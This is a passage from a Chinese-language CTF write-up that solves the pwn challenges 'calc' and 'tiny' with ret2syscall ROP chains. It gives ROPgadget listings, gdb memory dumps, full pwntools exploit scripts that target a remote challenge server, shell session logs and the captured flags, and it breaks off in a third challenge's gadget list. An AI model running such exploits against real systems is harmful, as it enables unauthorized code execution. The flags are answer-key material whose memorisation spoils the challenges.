0x00000000004010ef : nop ; ret
0x0000000000401449 : nop ; ud2 ; pop rdi ; ret
0x0000000000401453 : nop ; ud2 ; pop rdx ; ret
0x000000000040144e : nop ; ud2 ; pop rsi ; ret
0x0000000000401458 : nop ; ud2 ; syscall
0x00000000004010bc : nop dword ptr [rax] ; ret
0x00000000004011b5 : or bh, byte ptr [rax] ; jmp 0x40129e
0x00000000004012d8 : or bh, byte ptr [rax] ; jmp 0x401445
0x00000000004010e6 : or dword ptr [rdi + 0x404010], edi ; jmp rax
0x000000000040144b : or ebx, dword ptr [rdi - 0x3d] ; nop ; ud2 ; pop rsi ; ret
0x0000000000401455 : or ebx, dword ptr [rdx - 0x3d] ; nop ; ud2 ; syscall
0x0000000000401450 : or ebx, dword ptr [rsi - 0x3d] ; nop ; ud2 ; pop rdx ; ret
0x00000000004012be : outsb dx, byte ptr [rsi] ; sub eax, 0x89480000 ; ret 0x40be
0x0000000000401447 : pop rax ; ret
0x000000000040115d : pop rbp ; ret
0x000000000040144c : pop rdi ; ret
0x0000000000401456 : pop rdx ; ret
0x0000000000401451 : pop rsi ; ret
0x0000000000401036 : push 0 ; jmp 0x401020
0x0000000000401072 : push 0x2f ; add byte ptr [rax], al ; push 4 ; jmp 0x401020
0x0000000000401046 : push 1 ; jmp 0x401020
0x0000000000401056 : push 2 ; jmp 0x401020
0x0000000000401066 : push 3 ; jmp 0x401020
0x0000000000401076 : push 4 ; jmp 0x401020
0x0000000000401086 : push 5 ; jmp 0x401020
0x00000000004013a3 : push rdi ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x0000000000401016 : ret
0x00000000004011a1 : ret 0x40be
0x00000000004013c3 : ret 0x458b
0x00000000004017c3 : ret 0x8948
0x0000000000401239 : ret 0x8b48
0x0000000000401847 : retf
0x0000000000401606 : retf 0x8948
0x0000000000401378 : rol byte ptr [rbx + 0x458930e8], 0xe8 ; jmp 0x4013b9
0x00000000004013a0 : rol byte ptr [rbx + 0x458957e8], 0xe8 ; jmp 0x4013b9
0x00000000004011b3 : sal byte ptr [rbp + 0xa], 0xb8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40129e
0x00000000004012d6 : sal byte ptr [rbp + 0xa], 0xb8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401445
0x0000000000401494 : sal byte ptr [rbp + 7], 0xb8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014cd
0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x00000000004017c2 : scasd eax, dword ptr [rdi] ; ret 0x8948
0x0000000000401379 : sub eax, 0x30 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x00000000004013a1 : sub eax, 0x57 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x00000000004012bf : sub eax, 0x89480000 ; ret 0x40be
0x000000000040121c : sub esi, dword ptr [rbp + 0x3d] ; add qword ptr [rbp - 8], 1 ; jmp 0x40125c
0x0000000000401a55 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401a54 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040145b : syscall
0x000000000040100c : test eax, eax ; je 0x401012 ; call rax
0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404010 ; jmp rax
0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404010 ; jmp rax
0x00000000004011b2 : test eax, eax ; jne 0x4011c0 ; mov eax, 0 ; jmp 0x40129e
0x00000000004012d5 : test eax, eax ; jne 0x4012e3 ; mov eax, 0 ; jmp 0x401445
0x0000000000401493 : test eax, eax ; jne 0x40149e ; mov eax, 0 ; jmp 0x4014cd
0x000000000040100b : test rax, rax ; je 0x401012 ; call rax
0x000000000040144a : ud2 ; pop rdi ; ret
0x0000000000401454 : ud2 ; pop rdx ; ret
0x000000000040144f : ud2 ; pop rsi ; ret
0x0000000000401459 : ud2 ; syscall

Unique gadgets found: 208
```

可以用的 gadget 非常多，我们筛选一下：

```bash
❯ ROPgadget --binary calc | grep "pop rsi ; ret"
0x000000000040144e : nop ; ud2 ; pop rsi ; ret
0x000000000040144b : or ebx, dword ptr [rdi - 0x3d] ; nop ; ud2 ; pop rsi ; ret
0x0000000000401451 : pop rsi ; ret
0x000000000040144f : ud2 ; pop rsi ; ret

❯ ROPgadget --binary calc | grep "pop rdx ; ret"
0x0000000000401453 : nop ; ud2 ; pop rdx ; ret
0x0000000000401450 : or ebx, dword ptr [rsi - 0x3d] ; nop ; ud2 ; pop rdx ; ret
0x0000000000401456 : pop rdx ; ret
0x0000000000401454 : ud2 ; pop rdx ; ret

❯ ROPgadget --binary calc | grep "pop rax ; ret"
0x0000000000401447 : pop rax ; ret

❯ ROPgadget --binary calc | grep "syscall"
0x0000000000401458 : nop ; ud2 ; syscall
0x0000000000401455 : or ebx, dword ptr [rdx - 0x3d] ; nop ; ud2 ; syscall
0x000000000040145b : syscall
0x0000000000401459 : ud2 ; syscall

❯ ROPgadget --binary calc --string "/bin/sh"
Strings information
============================================================
0x0000000000402010 : /bin/sh
```

非常好，这里的 gadget 是标准的可以用于 ret2syscall 的 gadget。

我们可以将 edit() 封装一下，然后构造好 ret2syscall 的栈参数随后输入一个非法的字符触发 ret，进入预期的 ROP 链。

exp 如下：

```py
from pwn import *

exe = ELF("./calc")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 30672)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def edit(index, value):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(index).encode())
    io.sendlineafter(b"value (hex): ", hex(value).encode())
    io.recvuntil(b"updated\n")

def main():
    global io

    pop_rdi  = 0x40144c
    pop_rsi  = 0x401451
    pop_rdx  = 0x401456
    pop_rax  = 0x401447
    syscall  = 0x40145b
    bin_sh   = 0x402010
    
    edit(9,  pop_rdi)      # pop rdi; ret
    edit(10, bin_sh)       # /bin/sh
    edit(11, pop_rsi)      # pop rsi; ret
    edit(12, 0)            # rsi = 0
    edit(13, pop_rdx)      # pop rdx; ret
    edit(14, 0)            # rdx = 0
    edit(15, pop_rax)      # pop rax; ret
    edit(16, 59)           # rax = 59 (execve)
    edit(17, syscall)      # syscall
    
    io.recvuntil(b"> ")
    
    send(b"a")
    
    interactive()

if __name__ == "__main__":
    main()
```

输出如下：

```bash
❯ python exp.py
[*] '/home/halfcity/Desktop/calc'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to 110.42.112.160 on port 30672: Done
[DEBUG] Received 0x4a bytes:
    b'=== calc_beta ===\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x2 bytes:
    b'9\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x40144c\n'
[DEBUG] Received 0x25 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul\n'
[DEBUG] Received 0x1b bytes:
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'10\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x402010\n'
[DEBUG] Received 0x1e bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
[DEBUG] Received 0x22 bytes:
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'11\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x401451\n'
[DEBUG] Received 0x1e bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
[DEBUG] Received 0x22 bytes:
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'12\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x4 bytes:
    b'0x0\n'
[DEBUG] Received 0x24 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul'
[DEBUG] Received 0x1c bytes:
    b'\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'13\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x401456\n'
[DEBUG] Received 0x24 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul'
[DEBUG] Received 0x1c bytes:
    b'\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'14\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x4 bytes:
    b'0x0\n'
[DEBUG] Received 0x1d bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub'
[DEBUG] Received 0x23 bytes:
    b'\n'
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'15\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x401447\n'
[DEBUG] Received 0x1e bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
[DEBUG] Received 0x22 bytes:
    b'4. mul\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'16\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x5 bytes:
    b'0x3b\n'
[DEBUG] Received 0x24 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul'
[DEBUG] Received 0x1c bytes:
    b'\n'
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x7 bytes:
    b'index: '
[DEBUG] Sent 0x3 bytes:
    b'17\n'
[DEBUG] Received 0xd bytes:
    b'value (hex): '
[DEBUG] Sent 0x9 bytes:
    b'0x40145b\n'
[DEBUG] Received 0x25 bytes:
    b'updated\n'
    b'1. edit\n'
    b'2. add\n'
    b'3. sub\n'
    b'4. mul\n'
[DEBUG] Received 0x1b bytes:
    b'5. show\n'
    b'6. reset\n'
    b'7. exit\n'
    b'> '
[*] sending payload: b'a'
[DEBUG] Sent 0x1 bytes:
    b'a'
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x13 bytes:
    b'demo\n'
    b'entrypoint.sh\n'
demo
entrypoint.sh
$ ls /
[DEBUG] Sent 0x5 bytes:
    b'ls /\n'
[DEBUG] Received 0x5e bytes:
    b'app\n'
    b'bin\n'
    b'boot\n'
    b'dev\n'
    b'etc\n'
    b'flag\n'
    b'home\n'
    b'lib\n'
    b'lib64\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
app
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x2b bytes:
    b'flag{6731c5fa-ae9a-a2cf-c398-3d47393f077e}\n'
flag{6731c5fa-ae9a-a2cf-c398-3d47393f077e}
$
```

```txt
flag{6731c5fa-ae9a-a2cf-c398-3d47393f077e}
```

### 根本没有这种ELF

程序极其小，而且似乎有的地方调用了非法地址，由于与 System V ABI 不匹配 IDA 无法给出伪代码，只能辅助分析汇编。

这个程序应该是手写汇编然后直接编译的，似乎没有链接任何库。

经过分析可以发现程序执行后将前面执行过的内容进行了异或处理，这样会导致 gadget 出现变化。

注意到 0x400169 处程序解密完成，我们使用 pwndbg 运行到此处 dump 程序即可：

```bash
pwndbg> b *0x400169
Breakpoint 1 at 0x400169
pwndbg> c
Continuing.

Breakpoint 1, 0x0000000000400169 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────
*RAX  1
 RBX  0
*RCX  0x42
 RDX  0
*RDI  1
 RSI  0
*R8   0x400125 ◂— 0x68732f6e69622f /* '/bin/sh' */
 R9   0
*R10  0xa
 R11  0
 R12  0
 R13  0
 R14  0
 R15  0
 RBP  0
*RSP  0x7fffffffdc18 ◂— 0
*RIP  0x400169 ◂— lea rsi, [rip - 0xcd] /* 0xbaffffff33358d48 */
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────
b► 0x400169    lea    rsi, [rip - 0xcd]     RSI => 0x4000a3 ◂— insb byte ptr [rdi], dx /* 0x7266206f6c6c6548 */
   0x400170    mov    edx, 0x77             EDX => 0x77
   0x400175    call   0x400030                    <0x400030>

   0x40017a    lea    rdi, [rip]                  RDI => 0x400181
   0x400181    and    rdi, 0xfffffffffffff000     RDI => 0x400181 & -0x1000
   0x400188    mov    esi, 0x1000                 ESI => 0x1000
   0x40018d    mov    edx, 5                      EDX => 5
   0x400192    mov    eax, r10d
   0x400195    syscall
   0x400197    call   0x40012d                    <0x40012d>

   0x40019c    xor    rax, rax      RAX => 0
──────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc18 ◂— 0
... ↓        5 skipped
06:0030│     0x7fffffffdc48 —▸ 0x400141 ◂— call 0x4001d2 /* 0x480b0f0000008ce8 */
07:0038│     0x7fffffffdc50 ◂— 1
────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0 0x400169
   1 0x0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x401000 rwxp     1000       0 tiny
    0x7ffff7ff7000     0x7ffff7ffb000 r--p     4000       0 [vvar]
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000       0 [vvar_vclock]
    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000       0 [vdso]
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000       0 [stack]
pwndbg> dump memory full.bin 0x400000 0x401000
```

当然喜欢 IDA 的也可以使用 IDA 调试。

随后我们分析一下转储程序有什么可用的 gadget：

```bash
❯ ROPgadget --binary full.bin
Gadgets information
============================================================
0x0000000000400004 : add al, byte ptr [rcx] ; add dword ptr [rax], eax ; add byte ptr [rcx + 0x5f], al ; xor ebx, ebx ; ret
0x0000000000400028 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x000000000040002a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x000000000040002c : add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x000000000040018f : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x30], al ; syscall
0x00000000004001d5 : add byte ptr [rax], al ; jmp 0x400030
0x0000000000400190 : add byte ptr [rax], al ; mov eax, r10d ; syscall
0x00000000004001be : add byte ptr [rax], al ; mov rdi, rax ; syscall
0x0000000000400007 : add byte ptr [rax], al ; pop r15 ; xor ebx, ebx ; ret
0x000000000040002e : add byte ptr [rax], al ; syscall
0x0000000000400008 : add byte ptr [rcx + 0x5f], al ; xor ebx, ebx ; ret
0x0000000000400191 : add byte ptr [rcx + rcx*4 - 0x30], al ; syscall
0x000000000040018c : add byte ptr [rdx + 5], bh ; mov eax, r10d ; syscall
0x00000000004001ba : add byte ptr [rdx + 9], bh ; mov rdi, rax ; syscall
0x0000000000400006 : add dword ptr [rax], eax ; add byte ptr [rcx + 0x5f], al ; xor ebx, ebx ; ret
0x0000000000400005 : add dword ptr [rcx], eax ; add byte ptr [rax], al ; pop r15 ; xor ebx, ebx ; ret
0x000000000040018e : add eax, 0x44000000 ; mov eax, edx ; syscall
0x00000000004001ce : add esp, 0x30 ; ret
0x00000000004001cd : add rsp, 0x30 ; ret
0x00000000004001d3 : cmp al, 0 ; add byte ptr [rax], al ; jmp 0x400030
0x00000000004001a8 : imul edx, edx, 2 ; syscall
0x00000000004001a4 : ja 0x4001ae ; mov edx, cs ; imul edx, edx, 2 ; syscall
0x0000000000400121 : jle 0x40012d ; pop rax ; ret
0x00000000004001d7 : jmp 0x400030
0x000000000040011f : jns 0x400186 ; jle 0x40012d ; pop rax ; ret
0x00000000004001a3 : lea esi, [rdi + 8] ; mov edx, cs ; imul edx, edx, 2 ; syscall
0x00000000004001a2 : lea rsi, [r15 + 8] ; mov edx, cs ; imul edx, edx, 2 ; syscall
0x00000000004001d2 : mov eax, 0x3c ; jmp 0x400030
0x0000000000400193 : mov eax, edx ; syscall
0x0000000000400192 : mov eax, r10d ; syscall
0x00000000004001c1 : mov edi, eax ; syscall
0x000000000040018d : mov edx, 5 ; mov eax, r10d ; syscall
0x00000000004001bb : mov edx, 9 ; mov rdi, rax ; syscall
0x00000000004001a6 : mov edx, cs ; imul edx, edx, 2 ; syscall
0x00000000004001c0 : mov rdi, rax ; syscall
0x00000000004001bc : or dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rax ; syscall
0x0000000000400009 : pop r15 ; xor ebx, ebx ; ret
0x0000000000400123 : pop rax ; ret
0x000000000040000a : pop rdi ; xor ebx, ebx ; ret
0x000000000040000d : ret
0x00000000004001a7 : retf 0xd26b
0x00000000004001a9 : rol byte ptr [rdx], cl ; syscall
0x0000000000400030 : syscall
0x00000000004001c9 : test byte ptr [rax + 0x31], -0x2e ; add rsp, 0x30 ; ret
0x00000000004001d0 : xor bl, al ; mov eax, 0x3c ; jmp 0x400030
0x000000000040000b : xor ebx, ebx ; ret
0x00000000004001cb : xor edx, edx ; add rsp, 0x30 ; ret
0x00000000004001c8 : xor esi, esi ; xor rdx, rdx ; add rsp, 0x30 ; ret
0x00000000004001ca : xor rdx, rdx ; add rsp, 0x30 ; ret

Unique gadgets found: 49
```

我们还是筛选一下：

```txt
❯ ROPgadget --binary full.bin | grep "pop rdi"
0x000000000040000a : pop rdi ; xor ebx, ebx ; ret

❯ ROPgadget --binary full.bin | grep "pop rax ; ret"
0x0000000000400121 : jle 0x40012d ; pop rax ; ret
0x000000000040011f : jns 0x400186 ; jle 0x40012d ; pop rax ; ret
0x0000000000400123 : pop rax ; ret
```

这两个 gadget 是 execve 的关键。

```asm
LOAD:0000000000400169
LOAD:0000000000400169                    loc_400169:                             ; CODE XREF: LOAD:00000000004000F9↑j
LOAD:0000000000400169 030 48 8D 35 33 FF                 lea     rsi, loc_4000A1+2
LOAD:0000000000400169 030 FF FF
LOAD:0000000000400170
LOAD:0000000000400170                    loc_400170:                             ; CODE XREF: LOAD:0000000000400102↑j
LOAD:0000000000400170 030 BA 77 00 00 00                 mov     edx, 77h ; 'w'
LOAD:0000000000400175
LOAD:0000000000400175                    loc_400175:                             ; CODE XREF: LOAD:000000000040010C↑j
LOAD:0000000000400175 030 E8 B6 FE FF FF                 call    sub_400030
LOAD:000000000040017A
LOAD:000000000040017A                    loc_40017A:                             ; CODE XREF: LOAD:0000000000400109↑j
LOAD:000000000040017A 030 48 8D 3D 00 00                 lea     rdi, loc_400181
LOAD:000000000040017A 030 00 00
LOAD:0000000000400181
LOAD:0000000000400181                    loc_400181:                             ; DATA XREF: sub_400148:loc_40017A↑o
LOAD:0000000000400181 030 48 81 E7 00 F0                 and     rdi, 0FFFFFFFFFFFFF000h
LOAD:0000000000400181 030 FF FF
LOAD:0000000000400188 030 BE 00 10 00 00                 mov     esi, 1000h
LOAD:000000000040018D 030 BA 05 00 00 00                 mov     edx, 5
LOAD:0000000000400192 030 44 89 D0                       mov     eax, r10d
LOAD:0000000000400195 030 0F 05                          syscall                 ; LINUX -
LOAD:0000000000400197 030 E8 91 FF FF FF                 call    sub_40012D
LOAD:000000000040019C 030 48 31 C0                       xor     rax, rax
LOAD:000000000040019F 030 48 31 FF                       xor     rdi, rdi        ; fd
LOAD:00000000004001A2 030 49 8D 77 08                    lea     rsi, [r15+8]    ; buf
LOAD:00000000004001A6 030 8C CA                          mov     edx, cs
LOAD:00000000004001A8 030 6B D2 02                       imul    edx, 2          ; count
LOAD:00000000004001AB 030 0F 05                          syscall                 ; LINUX - sys_read
LOAD:00000000004001AD 030 48 8D 35 66 FF                 lea     rsi, buf        ; "Goodbye"
LOAD:00000000004001AD 030 FF FF
LOAD:00000000004001B4 030 48 C7 C0 01 00                 mov     rax, 1
LOAD:00000000004001B4 030 00 00
LOAD:00000000004001BB 030 BA 09 00 00 00                 mov     edx, 9          ; count
LOAD:00000000004001C0 030 48 89 C7                       mov     rdi, rax        ; fd
LOAD:00000000004001C3 030 0F 05                          syscall                 ; LINUX - sys_write
LOAD:00000000004001C5 030 31 FF                          xor     edi, edi
LOAD:00000000004001C7 030 48 31 F6                       xor     rsi, rsi
LOAD:00000000004001CA 030 48 31 D2                       xor     rdx, rdx
LOAD:00000000004001CD 030 48 83 C4 30                    add     rsp, 30h
LOAD:00000000004001D1 000 C3                             retn
LOAD:00000000004001D1                    sub_400148      endp
```

```asm
LOAD:0000000000400148 000 48 83 EC 30                    sub     rsp, 30h
```

这里可以看到栈帧大小是 0x30，但是程序试图将 `cs * 2` 大小的内容写入缓冲区。

一般 x64 下Linux 用户态程序段选择子 cs 的值是 0x33，因此这里存在较为严重的溢出。

这里可以找到运行时被异或出来的 `/bin/sh` 以及它的地址：

![](https://img.halfcity.top/2026/11/10/06ab6607130fb8ccf684bf76ba04ac75.png)

程序在 ret 前执行了 `xor rsi, rsi` `xor rdx, rdx` 将寄存器置 0：

![](https://img.halfcity.top/2026/11/10/17870b239be7d4a6676111d7f24ed675.png)

如此一来我们就可以利用溢出构造 ret2syscall 的 ROP 链了。

exp 如下：

```py
from pwn import *

exe = ELF("./tiny")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 40889)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    offset = 48
    
    pop_rax_ret   = 0x400123   # pop rax ; ret
    pop_rdi_ret   = 0x40000a   # pop rdi ; xor ebx, ebx ; ret
    syscall_ret   = 0x400030   # syscall ; ret
    bin_sh        = 0x400125   # "/bin/sh"
    
    # xor edi, edi ; xor rsi, rsi ; xor rdx, rdx
    payload  = b'A' * offset
    payload += p64(pop_rax_ret) + p64(59)          # rax = 59 (execve)
    payload += p64(pop_rdi_ret) + p64(bin_sh)      # rdi = "/bin/sh"
    payload += p64(syscall_ret)                    # syscall
    
    log.info(f"payload length: {len(payload)} bytes")
    send(payload)
    interactive()

if __name__ == "__main__":
    main()
```

输出如下：

```bash
❯ python exp.py
[*] '/home/halfcity/Desktop/tiny'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
[+] Opening connection to 110.42.112.160 on port 40889: Done
[*] payload length: 88 bytes (max 102)
[*] sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#\x01@\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\n\x00@\x00\x00\x00\x00\x00%\x01@\x00\x00\x00\x00\x000\x00@\x00\x00\x00\x00\x00'
[DEBUG] Sent 0x58 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  23 01 40 00  00 00 00 00  3b 00 00 00  00 00 00 00  │#·@·│····│;···│····│
    00000040  0a 00 40 00  00 00 00 00  25 01 40 00  00 00 00 00  │··@·│····│%·@·│····│
    00000050  30 00 40 00  00 00 00 00                            │0·@·│····│
    00000058
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
[DEBUG] Received 0x77 bytes:
    b'Hello from tiny elf ^_^\n'
    b'Some gadgets are hidden :P\n'
    b'There is also a gift for you...\n'
    b'Do you want to say something to me?\n'
Hello from tiny elf ^_^
Some gadgets are hidden :P
There is also a gift for you...
Do you want to say something to me?
[DEBUG] Received 0x9 bytes:
    b'Goodbye~\n'
Goodbye~
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2a bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'tiny\n'
bin
dev
flag
lib
lib32
lib64
libexec
tiny
$ ls /
[DEBUG] Sent 0x5 bytes:
    b'ls /\n'
[DEBUG] Received 0x2a bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'tiny\n'
bin
dev
flag
lib
lib32
lib64
libexec
tiny
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2d bytes:
    b'flag{dYN@mIC-XOR-AnD_HIDDEn_GAdgETs-1ee3a78}\n'
flag{dYN@mIC-XOR-AnD_HIDDEn_GAdgETs-1ee3a78}
$
```

```txt
flag{dYN@mIC-XOR-AnD_HIDDEn_GAdgETs-1ee3a78}
```

### Call My Name

![](https://img.halfcity.top/2026/11/10/dfeca17637eb06ee007ac4c06bf774ea.png)

很扎眼的 system() 函数，让人看到的第一眼就想跳到里面。

![](https://img.halfcity.top/2026/11/10/ab23e839425f0ff2c2e95b902f268f61.png)

`buf_` 的大小是 0x58，因此这里溢出了 24 个字节，也就是 3 个 QWORD。

检查一下 gadget：

```bash
❯ ROPgadget --binary call_my_name
Gadgets information
============================================================
0x00000000004011bb : add bh, bh ; loopne 0x401225 ; nop ; ret
0x000000000040124b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rdi - 0x3d], bl ; pop rsi ; ret
0x000000000040118c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x000000000040124c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rdi ; ret
0x000000000040124d : add byte ptr [rax], al ; add byte ptr [rdi - 0x3d], bl ; pop rsi ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040122a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040118e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040124e : add byte ptr [rax], al ; pop rdi ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040122b : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040124f : add byte ptr [rdi - 0x3d], bl ; pop rsi ; ret
0x0000000000401229 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011ba : add dil, dil ; loopne 0x401225 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040122c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401227 : add eax, 0x2e5b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401292 : add esp, 0x58 ; ret
